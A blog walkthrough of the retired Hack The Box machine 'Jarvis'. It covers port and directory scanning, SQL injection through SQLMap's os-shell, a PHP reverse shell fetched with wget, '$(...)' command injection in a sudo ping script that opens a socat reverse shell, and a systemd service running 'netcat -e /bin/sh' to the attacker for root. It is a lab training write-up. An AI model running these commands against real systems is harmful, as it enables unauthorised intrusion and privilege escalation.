---
layout: post
title:  "HTB Jarvis Walkthrough"
author: nanobyte
date:   2019-11-09
description: Hack The Box writeup for Jarvis, Retired Medium Box
tags: HTB_Walkthrough SQLMap said systemctl
---

Jarvis was a Medium rated box on Hack The Box. This machine was another great box that I thoroughly enjoyed, and the first one I got to use SQLMap's os-shell. I also was able to learn how to create my first malicious SUID systemctl service! Now, onto the goods.

As normal, to start enumeration I began with a nmap scan. I did a full service version scan (-sV), a full nap script scan (-sC), a full port scan of the entire port range of ports 1 through 65535 (-p-) and saved the nmap output to all formats (-oA):

{% highlight bash linenos %}
nmap -sV -sC -p- -oA jarvis.htb 10.10.10.143
Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-15 18:42 CDT
Nmap scan report for 10.10.10.143
Host is up (0.039s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                      
Nmap done: 1 IP address (1 host up) scanned in 56.05 seconds
{% endhighlight %}

Alongside running nmap, I also ran robuster for directory and file discovery. I used the small directory wordlist provided by dirbuster in Kali Linux. I also utilized the -x option. In gobuster, this searches for file extensions provided in the command. By default, I usually start with php, html, and him extensions:

{% highlight bash linenos %}
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.10.143 -x php,html,htm
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.143
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,html,htm,txt
[+] Timeout:        10s
===============================================================
2019/10/15 18:54:26 Starting gobuster
===============================================================
/index.php (Status: 200)
/images (Status: 301)
/nav.php (Status: 200)
/footer.php (Status: 200)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/phpmyadmin (Status: 301)
/room.php (Status: 302)
/connection.php (Status: 200)
/sass (Status: 301)
===============================================================
2019/10/15 19:22:44 Finished
===============================================================
{% endhighlight %}

While these were running, I also began manually enumerating and investigating the website for Jarvis. This (as you should be able to tell) is a themed hotel for Stark Industries from Marvel's Iron Man. While looking over the website, I noticed something interesting with the URL when I was navigating the available hotel rooms. To be specific, I noticed this:

{% highlight bash linenos %}
http://supersecurehotel.htb/room.php?cod=1
{% endhighlight %}

The URL utilizes a database to provide the room pages! With this information, I threw the first tool that comes to mind. SQLMap. For my first SQLMap command, I used the --dbs option to enumerate and locate any available databases:

{% highlight bash linenos %}
sqlmap -u http://supersecurehotel.htb/room.php?cod=1 --dbs
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.3#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:42:22 /2019-10-15/

[20:42:23] [INFO] resuming back-end DBMS 'mysql'
[20:42:23] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: cod (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cod=1 AND 1133=1133

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: cod=1 OR SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: cod=-5818 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71627a6b71,0x46674577596d525958626f4b6f426545445a6b485a4655705855484b476c454a47705171796f4456,0x7170787171),NULL,NULL-- KnHI
---
[20:42:24] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9.0 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0.12
[20:42:24] [INFO] fetching database names
[20:42:24] [INFO] used SQL query returns 4 entries
[20:42:24] [INFO] retrieved: 'hotel'
[20:42:25] [INFO] retrieved: 'information_schema'
[20:42:25] [INFO] retrieved: 'mysql'
[20:42:25] [INFO] retrieved: 'performance_schema'
available databases [4]:                                                                                                                                                            
[*] hotel
[*] information_schema
[*] mysql
[*] performance_schema
{% endhighlight %}

From here, I dove deep into enumerating the databases, tables and columns. I was able to find some credentials, but that led nowhere. For the sake of this writeup, I will spare those details. But SQLMap also has the ability to not only find this information. SQLMap also provides tools such as shells, and one of those shells is an interactive system shell (--os-shell):

{% highlight bash linenos %}
sqlmap -u http://supersecurehotel.htb/room.php?cod=1 --os-shell
Use Default <PHP>
Use Default Dir
{% endhighlight %}

And that returned a shell. Enumerating this shell, there is wget. Wget allows me to download a file from an external web server. So, I headed over to pentest monkey and downloaded a php-reverse-shell (http://pentestmonkey.net/tools/web-shells/php-reverse-shell). I downloaded this shell, modified my IP and port in the file, and saved it into a directory in my Kali. Below are the lines I modified, that are just under the comments, where the //CHANGE THIS comments are:

{% highlight bash linenos %}
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.29';  // CHANGE THIS
$port = 1337;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
{% endhighlight %}

Once I had the reverse shell configured, I used a python simple web server to host this reverse shell:

{% highlight bash linenos %}
python -m SimpleHTTPServer 80
{% endhighlight %}

Then, over on Jarvis' interactive shell I had, used wget to download my hosted reverse shell. The -O option tells wget to output the file once downloaded.

{% highlight bash linenos %}
wget http://<MY-KALI-IP>/php-reverse-shell.php -O php-reverse-shell.php
{% endhighlight %}

Then, on my Kali, setup a nc listener that the php-reverse-shell connects to. With nc, I used the listener option (-l), the verbose option (-v), and the port option (-p) to designate a port to listen on:

{% highlight bash linenos %}
nc -lvp 1337
{% endhighlight %}

And with that, I had a reverse shell connected back to my Kali box from Jarvis. From here, I used wget to download and run (the first thing I always run on a Linux machine) linenum.sh for Linux enumeration. If you have never used it, it can be found on GitHub (https://github.com/rebootuser/LinEnum). After linen ran, and checking the results, I found that as the user I was logged in as (pepper) I had access to sudo. I completed this with the -l option. From sudo man page, this option "If no command is specified, the -l (list) option will list the allowed (and forbidden) commands for the invoking user":

{% highlight bash linenos %}
sudo -l

sudo -u pepper /var/www/Admin-Utilities/simpler.py -p 127.0.0.1;
{% endhighlight %}

I headed over, and looked at the python script I had access to run with sudo rights. Looking through the code, there is a function declaration that calls ping to run.

This function also eliminates the use of some characters which are common in command injection. I started playing around with the script, running it constantly looking or ways to get command injection. I found a character which was not listed in the forbidden that can be used to escape, $. Essentially, I used this escape to run commands from the simpler.py script:

{% highlight bash linenos %}
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(cat /home/pepper/user.txt)
$(cat /home/pepper/user.txt)
ping: 2afa36c4f05bXXXXXXXXXXXXXXXXXXXX: Temporary failure in name resolution
{% endhighlight %}

And with that, I owned user! But, this would be a very inefficient shell to proceed. While I was enumerating, I found that there was socat installed. Socat would be awesome to get fully functional TTY shell. I setup a socat listener on my Kali:

{% highlight bash linenos %}
socat file:`tty`,raw,echo=0 tcp-listen:4444
{% endhighlight %}

And re-ran simpler.py, calling a socat connection to my listener:

{% highlight bash linenos %}
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.28:31337)
{% endhighlight %}

And I now have a second shell running from Jarvis to my Kali. To get a fully functional socat shell, I also had to run the following:

{% highlight bash linenos %}
TERM=ansi
{% endhighlight %}

Now I had a fully functional socat shell. Since I was now a new user, I re-ran my linenum.sh script. During this enumeration, I found that there was a binary running with SUID set:

{% highlight bash linenos %}
/bin/fusermount
/bin/mount
/bin/ping
/bin/systemctl
/bin/umount
/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
{% endhighlight %}

Can you spot it in this list? It is systemctl. Normally, an unprivileged user should not have access to run this binary. This took quite a bit of time, and effort, on my end to learn this. I could manage system processes, but I could not write to the standard directory where they need to be in to start. To get around this, I learned about the /dev/shm/ directory. I wrote a small and simple process to this directory:

{% highlight bash linenos %}
nano /dev/shm/my.service

[Service]
Type=oneshot
ExecStart=/bin/netcat -e /bin/sh 10.10.14.29 31347
[Install]
WantedBy=multi-user.target
{% endhighlight %}

And once it was made, I had to then enable the process. The next two commands enable the process, give it executable permissions:

{% highlight bash linenos %}
systemctl enable /dev/shm/my.service
Chmod +x my.service
{% endhighlight %}

And now, for my third reverse shell! On my Kali I setup ANOTHER listener (I began to run out of 1337 speak numbers):

{% highlight bash linenos %}
nc -lvp 31347
{% endhighlight %}

And on Jarvis, used systemctl to run my new process:

{% highlight bash linenos %}
nsystemctl start my.service
{% endhighlight %}

And with that, back on the final reverse shell, we are now root:

{% highlight bash linenos %}
cat /root/root.txt
d41d8cd98f00XXXXXXXXXXXXXXXXXXXX
{% endhighlight %}
